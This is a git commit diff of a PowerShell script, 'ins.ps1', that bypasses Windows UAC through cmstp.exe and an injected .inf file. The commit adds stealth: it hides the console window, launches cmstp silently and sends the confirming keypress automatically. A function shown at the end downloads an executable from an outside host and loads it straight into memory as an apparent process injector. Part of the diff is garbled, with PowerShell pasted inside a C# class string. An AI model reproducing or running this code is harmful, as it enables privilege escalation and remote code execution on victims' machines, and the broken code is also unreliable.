4016c53853ca0b3920990bb0bdfdc472763dc608
enkiark <96149033+enkiark@users.noreply.github.com>
2023-08-05 07:27:50 +0900

    Update ins.ps1

--- ins.ps1
+++ ins.ps1
@@ -1,5 +1,3 @@
-
-
 function Invoke-UAC
 {
 <#
@@ -78,6 +76,7 @@ Este script esta basado en una investigacion del blog de zc00l: https://0x00-0x0
 $sign = '$chicago$'
 $code = @"
 using System;
+using System.Threading;
 using System.Text;
 using System.IO;
 using System.Diagnostics;
@@ -87,8 +86,42 @@ using System.Runtime.InteropServices;
 
 public class CMSTPBypass
 {
-public static string InfData = @"[version]
-Signature=$chicago$
+ Add-Type -TypeDefinition @'
+namespace Win32
+{
+    //https://msdn.microsoft.com/en-us/library/windows/desktop/ms633548(v=vs.85).aspx
+    public static class Functions
+    {
+        [System.Runtime.InteropServices.DllImport("User32.dll", EntryPoint="ShowWindow")]
+        public static extern bool SW(System.IntPtr hWnd, Win32.SW nCmdShow);
+    }
+    public enum SW
+    {
+        HIDE               = 0,
+        SHOW_NORMAL        = 1,
+        SHOW_MINIMIZED     = 2,
+        MAXIMIZE           = 3,
+        SHOW_MAXIMIZED     = 3,
+        SHOW_NO_ACTIVE     = 4,
+        SHOW               = 5,
+        MINIMIZE           = 6,
+        SHOW_MIN_NO_ACTIVE = 7,
+        SHOW_NA            = 8,
+        RESTORE            = 9,
+        SHOW_DEFAULT       = 10,
+        FORCE_MINIMIZE     = 11
+    }
+}
+'@
+
+. ([ScriptBlock]::Create('using namespace Win32'))
+
+$mainWindowHandle = (Get-Process -ID $PID).MainWindowHandle
+[Functions]::SW($mainWindowHandle, [SW]::HIDE)
+
+
+     public static string InfData = @"[version]
+Signature=$sign
 AdvancedINF=2.5
 
 [DefaultInstall]
@@ -96,8 +129,7 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
-; Commands Here will be run Before Setup Begins to install
-REPLACE_COMMAND_LINE
+LINE
 taskkill /IM cmstp.exe /F
 
 [CustInstDestSectionAllUsers]
@@ -109,67 +141,57 @@ taskkill /IM cmstp.exe /F
 [Strings]
 ServiceName=""CorpVPN""
 ShortSvcName=""CorpVPN""
-";
 
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+";
+    
+    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)] 
+    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd); 
+
+    [DllImport("user32.dll")]
+    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+    [DllImport("user32.dll")]
+    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+
 
     public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
 
-    /* Generates a random named .inf file with command to be executed with UAC privileges */
     public static string SetInfFile(string CommandToExecute)
     {
-        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
-        string TemporaryDir = "C:\\windows\\temp";
         StringBuilder OutputFile = new StringBuilder();
-        OutputFile.Append(TemporaryDir);
+        OutputFile.Append("C:\\windows\\temp");
         OutputFile.Append("\\");
-        OutputFile.Append(RandomFileName);
+        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
         OutputFile.Append(".inf");
         StringBuilder newInfData = new StringBuilder(InfData);
-        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
+        newInfData.Replace("LINE", CommandToExecute);
         File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
         return OutputFile.ToString();
     }
 
     public static bool Execute(string CommandToExecute)
     {
-        if(!File.Exists(BinaryPath))
-        {
-            Console.WriteLine("Could not find cmstp.exe binary!");
-            return false;
-        }
+
+        const int WM_SYSKEYDOWN = 0x0100;
+        const int VK_RETURN = 0x0D;
+
+
         StringBuilder InfFile = new StringBuilder();
         InfFile.Append(SetInfFile(CommandToExecute));
 
-        Console.WriteLine("Payload file written to " + InfFile.ToString());
         ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
         startInfo.Arguments = "/au " + InfFile.ToString();
-        startInfo.UseShellExecute = false;
-        Process.Start(startInfo);
+        IntPtr dptr = Marshal.AllocHGlobal(1); 
+        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments,  "", 0);
 
-        IntPtr windowHandle = new IntPtr();
-        windowHandle = IntPtr.Zero;
-        do {
-            windowHandle = SetWindowActive("cmstp");
-        } while (windowHandle == IntPtr.Zero);
+        Thread.Sleep(5000);
+        IntPtr WindowToFind = FindWindow(null, "CorpVPN"); // Window Titel
 
-        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
+        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);        
         return true;
     }
 
-    public static IntPtr SetWindowActive(string ProcessName)
-    {
-        Process[] target = Process.GetProcessesByName(ProcessName);
-        if(target.Length == 0) return IntPtr.Zero;
-        target[0].Refresh();
-        IntPtr WindowHandle = new IntPtr();
-        WindowHandle = target[0].MainWindowHandle;
-        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
-        SetForegroundWindow(WindowHandle);
-        ShowWindow(WindowHandle, 5);
-        return WindowHandle;
-    }
+
 }
 "@
 
@@ -209,7 +231,44 @@ else {
     Execute
 }
 }
+function Set-WindowActive
+{
+  [CmdletBinding()]
 
+  Param
+  (
+    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
+  )
+  
+  Process
+  {
+    $memberDefinition = @'
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+
+'@
+
+    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
+    $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
+    If ($hwnd) 
+    {
+      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
+      [User32.Api]::SetForegroundWindow($hwnd)
+      [User32.Api]::ShowWindow($hwnd, 5)
+    }
+    Else 
+    {
+      [string] $hwnd = 'N/A'
+    }
+
+    $hash = @{
+      Process = $Name
+      Hwnd    = $hwnd
+    }
+        
+    New-Object -TypeName PsObject -Property $hash
+  }
+}
 function  Invoke-mg {
   $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://skt.mcsoft.org/Migrator7.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [PEx64_Injector.Program]::Main("")
 }
